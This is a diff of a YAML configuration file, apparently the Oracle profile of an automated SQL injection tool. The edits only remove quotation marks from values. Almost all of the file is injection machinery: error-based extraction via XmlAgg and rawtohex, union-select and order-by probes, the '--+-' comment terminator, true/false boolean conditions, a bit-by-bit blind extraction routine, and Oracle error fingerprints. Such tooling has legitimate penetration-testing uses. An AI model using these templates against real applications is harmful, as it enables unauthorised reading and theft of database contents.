@@ -1,4 +1,4 @@
-vendor: ""
+vendor: 
 resource: 
  info: |
   SELECT 
@@ -20,7 +20,7 @@ resource:
                        replace(
                            XmlAgg(
                                XmlElement(
-                                   \"a\",
+                                   "a",
                                    rawtohex(
                                        '${ENCLOSE_VALUE_SQL}'
                                        || s
@@ -57,7 +57,7 @@ resource:
                        replace(
                            XmlAgg(
                                XmlElement(
-                                   \"a\",
+                                   "a",
                                    rawtohex(
                                        '${ENCLOSE_VALUE_SQL}'
                                        || s
@@ -95,7 +95,7 @@ resource:
                        replace(
                            XmlAgg(
                                XmlElement(
-                                   \"a\",
+                                   "a",
                                    rawtohex(
                                        '${ENCLOSE_VALUE_SQL}'
                                        || s
@@ -134,7 +134,7 @@ resource:
                         replace(
                             XmlAgg(
                                 XmlElement(
-                                    \"a\",
+                                    "a",
                                     rawtohex(
                                         '${ENCLOSE_VALUE_SQL}'
                                         || s
@@ -163,7 +163,7 @@ resource:
         {limit}
     )
    fields: 
-    field: "trim(to_char(${FIELD}))"
+    field: trim(to_char(${FIELD}))
     concat: "|| '%7f' ||"
     
 strategy: 
@@ -178,8 +178,8 @@ strategy:
                ${CAPACITY}
            ) from dual
    )
-  limit: "having count(*) between ${LIMIT} and 65536"
-  failsafe: "to_char(1337${INDICE}7330%2b1)"
+  limit: having count(*) between ${LIMIT} and 65536
+  failsafe: to_char(1337${INDICE}7330%2b1)
   calibrator: |
    rpad(
        '${CALIBRATOR_SQL}', 
@@ -187,17 +187,17 @@ strategy:
        '${CALIBRATOR_SQL}'
    ) s
   limitBoundary: 1
-  endingComment: "--+-"
+  endingComment: --+-
   fingerprint: 
    errorMessage: 
-    - "function.oci"
+    - function.oci
     - "Warning: oci_parse()"
     - "Warning: oci_execute()"
     - "Warning: oci_fetch_array()"
-    - "Unclosed quotation mark after the character string '"
+    - Unclosed quotation mark after the character string '
     
  normal: 
-  indices: "union select ${INDICES} from dual"
+  indices: union select ${INDICES} from dual
   capacity: |
    (
        SELECT 
@@ -206,25 +206,25 @@ strategy:
            || ${CALIBRATOR} 
        FROM dual
    )
-  orderBy: "order by 1337"
+  orderBy: order by 1337
   
  boolean: 
   test: 
    falses: 
-    - "1 = 0"
+    - 1 = 0
     - "'a' %21= 'a'"
     - "'b' %21= 'b'"
-    - "1 = 2"
-    - "1 %21= 1"
-    - "2 %21= 2"
+    - 1 = 2
+    - 1 %21= 1
+    - 2 %21= 2
    trues: 
-    - "0 = 0"
+    - 0 = 0
     - "'a' %21= 'b'"
     - "'a' = 'a'"
-    - "1 = 1"
-    - "2 = 2"
-    - "1 %21= 2"
-   initialization: "0%2b1 = 1"
+    - 1 = 1
+    - 2 = 2
+    - 1 %21= 2
+   initialization: 0%2b1 = 1
    bit: |
     0 != BITAND(
         ascii(
@@ -236,6 +236,6 @@ strategy:
         ), 
         ${BIT}
     )
-   length: "length(${INJECTION}) > ${INDEX}"
+   length: length(${INJECTION}) > ${INDEX}
    
-  blind: "and ${TEST}"
+  blind: and ${TEST}
